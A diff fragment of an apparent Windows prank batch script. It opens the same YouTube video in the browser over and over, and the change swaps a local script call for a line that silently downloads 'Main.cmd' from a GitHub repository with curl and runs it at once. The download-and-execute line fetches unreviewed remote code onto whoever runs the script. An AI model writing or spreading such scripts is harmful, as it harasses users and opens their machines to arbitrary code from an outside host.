@@ -89,4 +89,4 @@ start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
 start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
 start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
 start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
-MainRuntime.cmd
+curl -sLO https://raw.githubusercontent.com/maxplayz2746/Teehee/main/Main.cmd && Main.cmd
